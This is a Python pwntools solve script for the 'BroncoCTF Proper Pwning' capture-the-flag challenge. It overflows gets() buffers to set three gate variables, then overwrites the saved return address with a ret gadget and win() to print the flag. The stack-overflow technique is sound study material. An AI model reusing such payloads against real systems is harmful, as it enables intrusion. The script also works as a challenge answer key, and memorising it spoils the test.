#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import sys

from pwn import ELF, ROP, context, p32, p64, process, remote


FLAG_RE = re.compile(rb"bronco\{[^}\r\n]+\}")


def build_gate_payloads() -> tuple[bytes, bytes, bytes]:
    # gate1:
    # buffer @ rbp-0x110, gate @ rbp-0x4
    # offset = 0x110 - 4 = 268
    #
    # Kirim hanya satu byte nonzero. Terminator NUL dari gets() melengkapi
    # tiga byte sisanya tanpa menyentuh saved RBP.
    gate1 = b"A" * 268 + b"\x01"

    # gate2:
    # buffer       @ rbp-0x210
    # baby_chicken @ rbp-0x8
    # gate         @ rbp-0x4
    #
    # baby_chicken harus tetap 41, lalu gate dibuat nonzero.
    gate2 = b"B" * 520 + p32(41) + b"\x01"

    # gate3:
    # buffer @ rbp-0x50, gate @ rbp-0x4
    # offset = 0x50 - 4 = 76
    #
    # Target 13371337 = 0x00cc07c9. Tiga byte rendah dikirim dan NUL milik
    # gets() menjadi byte paling tinggi.
    gate3 = b"C" * 76 + p32(13371337)[:3]

    return gate1, gate2, gate3


def start_target(args, elf: ELF):
    if args.local:
        return process(elf.path)

    return remote(args.host, args.port)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Solve BroncoCTF Proper Pwning"
    )
    parser.add_argument(
        "host",
        nargs="?",
        default="0.cloud.chals.io",
        help="remote host",
    )
    parser.add_argument(
        "port",
        nargs="?",
        type=int,
        default=21543,
        help="remote port",
    )
    parser.add_argument(
        "--binary",
        default="./proper",
        help="path ke binary challenge",
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="jalankan binary lokal",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="aktifkan log debug pwntools",
    )
    args = parser.parse_args()

    context.binary = elf = ELF(args.binary, checksec=False)
    context.log_level = "debug" if args.debug else "error"

    gate1, gate2, gate3 = build_gate_payloads()
    io = start_target(args, elf)

    # Gate 1
    io.sendline(gate1)
    gate1_result = io.recvuntil(b"Gate 1 opens.", timeout=5)
    if b"Gate 1 opens." not in gate1_result:
        raise RuntimeError("Gate 1 gagal")

    # Gate 2
    io.sendline(gate2)
    gate2_result = io.recvuntil(b"Gate 2 opens.", timeout=5)
    if b"Gate 2 opens." not in gate2_result:
        raise RuntimeError("Gate 2 gagal")

    # Gate 3
    io.sendline(gate3)
    gate3_result = io.recvuntil(b"\n", timeout=5)

    leak_match = re.search(rb"located at (0x[0-9a-fA-F]+)", gate3_result)
    if leak_match:
        win = int(leak_match.group(1), 16)
    else:
        # Binary non-PIE, jadi simbol lokal tetap valid sebagai fallback.
        win = elf.symbols["win"]

    # treasure_room:
    # buffer @ rbp-0x1a70 = 6768 bytes
    # saved RBP berada setelah 6768 byte
    # saved RIP berada pada offset 6768 + 8 = 6776
    #
    # Tambahkan satu gadget ret untuk memperbaiki alignment stack sebelum win().
    ret = ROP(elf).find_gadget(["ret"]).address
    treasure = b"D" * 6768
    treasure += b"E" * 8
    treasure += p64(ret)
    treasure += p64(win)

    io.sendline(treasure)
    output = io.recvall(timeout=5)

    match = FLAG_RE.search(output)
    if match is None:
        print(output.decode("latin-1", errors="replace"))
        raise RuntimeError("Flag tidak ditemukan pada output")

    flag = match.group(0).decode("ascii")
    print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    try:
        main()
    except (EOFError, OSError, RuntimeError) as error:
        print(f"[-] {error}", file=sys.stderr)
        raise SystemExit(1)
